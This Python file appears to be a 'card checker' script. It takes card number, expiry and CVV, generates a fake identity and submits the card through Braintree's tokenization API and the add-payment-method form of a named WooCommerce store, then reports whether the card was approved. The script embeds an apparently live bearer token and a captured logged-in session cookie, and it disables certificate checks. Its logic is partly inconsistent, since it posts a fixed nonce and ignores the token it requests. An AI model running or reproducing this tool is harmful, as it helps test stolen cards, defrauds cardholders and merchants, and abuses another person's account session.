def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	
	r.verify = False
	
	user = user_agent.generate_user_agent()
	def generate_full_name():
	    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
	                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
	                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
	                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
	                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
	                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
	                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
	                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
	                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
	                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] 
	    
	    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
	                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
	                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
	                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
	                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
	                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
	                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
	                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] 
	                   
	    full_name = random.choice(first_names) + " " + random.choice(last_names)
	    first_name, last_name = full_name.split()
	    
	    return first_name, last_name
	
	def generate_address():
	    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
	    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
	    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
	    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
	
	    city = random.choice(cities)
	    state = states[cities.index(city)]
	    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
	    zip_code = zip_codes[states.index(state)]
	
	    return city, state, street_address, zip_code
	
	
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
	
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
	
	
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
	
	
	def generate_random_code(length=32):
	    letters_and_digits = string.ascii_letters + string.digits
	    return ''.join(random.choice(letters_and_digits) for _ in range(length))
	
	corr = generate_random_code()
	
	sess = generate_random_code()

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,ca-EG;q=0.6,ca;q=0.5,en-GB;q=0.4,en-US;q=0.3',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjI0NTQ3NzUsImp0aSI6Ijg3NjAwNWM3LWNlM2QtNDhmMi04N2NkLTUwNzkyZTU1YTdhMCIsInN1YiI6ImRrZHNnemQ4Nzc2amY3eHoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRrZHNnemQ4Nzc2amY3eHoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.NpKG0vrDg-bsA1l2cpWbhg5LhLlbNE_GhWBzXSgqaJE1C2_Lrwj-tcsR-ij0jmmroX1u5hwksok_55wldhYW0A',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '9c608e9a-b156-49ae-8020-2dcbc743ba46',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)



	import requests

	cookies = {
    'cookielawinfo-checkbox-necessary': 'yes',
    'cookielawinfo-checkbox-non-necessary': 'yes',
    'cerber_groove': '292f8f9cf5ce1c28926a98b16a0adcf3',
    'cerber_groove_x_uWXvaoMUg3Z4AP0dHsw2ClcFzSe9kTG': '1XSeYOtDf0J3shEFBQwldoZGCaxUj9n',
    'apbct_site_landing_ts': '1722367929',
    'apbct_site_referer': 'UNKNOWN',
    'fMIRJXpnrbaqSs': '1l6bv5f',
    'KzytICOT': 'mDjlM5S%40T',
    'LBsMZGRkfAXKJ': 'x%403W%5BP8IRr4QJs6T',
    'ct_has_scrolled': 'true',
    'ct_timezone': '3',
    'apbct_headless': 'false',
    'ct_checkjs': 'dbdedfb24d55cb03e1f8491980cd39a0cd85fa79133000d0de924df6393d7495',
    'wordpress_apbct_antibot': '8cb7cfc64e80e0dfcf0f3a0e672e1d0691a0a701734889c5f4d59d5e71a514a7',
    'ct_mouse_moved': 'true',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    'ct_has_input_focused': 'true',
    'ct_has_key_up': 'true',
    'ct_checked_emails': '0',
    'wordpress_logged_in_87444321d442f908c21db979e4920844': 'yousefahzne%7C1723577805%7CleVj08HJLi7NTdA3lPqGGrFltNaKb5CSVedaDq3q1oE%7Cab91e14c5a6506fb49f765574219cd39033f104da2160a85346f103f040fe3fb',
    'tinv_wishlistkey': 'bdfa13',
    'tinvwl_wishlists_data_counter': '0',
    'apbct_prev_referer': 'https%3A%2F%2Fstraddlecreekspins.com%2Fmy-account%2Fpayment-methods%2F',
    'ct_ps_timestamp': '1722371893',
    'ct_screen_info': '%7B%22fullWidth%22%3A360%2C%22fullHeight%22%3A1636%2C%22visibleWidth%22%3A360%2C%22visibleHeight%22%3A696%7D',
    'apbct_timestamp': '1722368409',
    'apbct_page_hits': '12',
    'apbct_cookies_test': '%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%2522bfca37fdf8846cbd4b01f856cef94a76%2522%257D',
    'ct_fkp_timestamp': '1722371932',
    'ct_pointer_data': '%5B%5B479%2C232%2C42802%5D%5D',
}

	headers = {
    'authority': 'straddlecreekspins.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,ca-EG;q=0.6,ca;q=0.5,en-GB;q=0.4,en-US;q=0.3',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; cerber_groove=292f8f9cf5ce1c28926a98b16a0adcf3; cerber_groove_x_uWXvaoMUg3Z4AP0dHsw2ClcFzSe9kTG=1XSeYOtDf0J3shEFBQwldoZGCaxUj9n; apbct_site_landing_ts=1722367929; apbct_site_referer=UNKNOWN; fMIRJXpnrbaqSs=1l6bv5f; KzytICOT=mDjlM5S%40T; LBsMZGRkfAXKJ=x%403W%5BP8IRr4QJs6T; ct_has_scrolled=true; ct_timezone=3; apbct_headless=false; ct_checkjs=dbdedfb24d55cb03e1f8491980cd39a0cd85fa79133000d0de924df6393d7495; wordpress_apbct_antibot=8cb7cfc64e80e0dfcf0f3a0e672e1d0691a0a701734889c5f4d59d5e71a514a7; ct_mouse_moved=true; wordpress_test_cookie=WP%20Cookie%20check; ct_has_input_focused=true; ct_has_key_up=true; ct_checked_emails=0; wordpress_logged_in_87444321d442f908c21db979e4920844=yousefahzne%7C1723577805%7CleVj08HJLi7NTdA3lPqGGrFltNaKb5CSVedaDq3q1oE%7Cab91e14c5a6506fb49f765574219cd39033f104da2160a85346f103f040fe3fb; tinv_wishlistkey=bdfa13; tinvwl_wishlists_data_counter=0; apbct_prev_referer=https%3A%2F%2Fstraddlecreekspins.com%2Fmy-account%2Fpayment-methods%2F; ct_ps_timestamp=1722371893; ct_screen_info=%7B%22fullWidth%22%3A360%2C%22fullHeight%22%3A1636%2C%22visibleWidth%22%3A360%2C%22visibleHeight%22%3A696%7D; apbct_timestamp=1722368409; apbct_page_hits=12; apbct_cookies_test=%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%2522bfca37fdf8846cbd4b01f856cef94a76%2522%257D; ct_fkp_timestamp=1722371932; ct_pointer_data=%5B%5B479%2C232%2C42802%5D%5D',
    'origin': 'https://straddlecreekspins.com',
    'pragma': 'no-cache',
    'referer': 'https://straddlecreekspins.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'master-card'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', 'tokencc_bh_wgxbt4_rvqgf6_vtn63t_kkw986_yh7'),
    ('wc_braintree_device_data', '{"correlation_id":"'+corr+'"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"'+corr+'"}'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', 'b66ae4cc0a'),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
    ('apbct_visible_fields', 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJ3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtY2FyZC10eXBlIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtZW5hYmxlZCB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLXZlcmlmaWVkIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtb3JkZXItdG90YWwgd2NfYnJhaW50cmVlX2NyZWRpdF9jYXJkX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC10b2tlbml6ZS1wYXltZW50LW1ldGhvZCB3Y19icmFpbnRyZWVfcGF5cGFsX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjX2JyYWludHJlZV9wYXlwYWxfYW1vdW50IHdjX2JyYWludHJlZV9wYXlwYWxfY3VycmVuY3kgd2NfYnJhaW50cmVlX3BheXBhbF9sb2NhbGUgd2MtYnJhaW50cmVlLXBheXBhbC10b2tlbml6ZS1wYXltZW50LW1ldGhvZCB3b29jb21tZXJjZS1hZGQtcGF5bWVudC1tZXRob2Qtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciB3b29jb21tZXJjZV9hZGRfcGF5bWVudF9tZXRob2QiLCJpbnZpc2libGVfZmllbGRzX2NvdW50IjoxNn19'),
]

	response = requests.post(
    'https://straddlecreekspins.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)

	text = response.text
	
	pattern = r'Status code (.*?)\s*</li>'
	
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	
				
	return result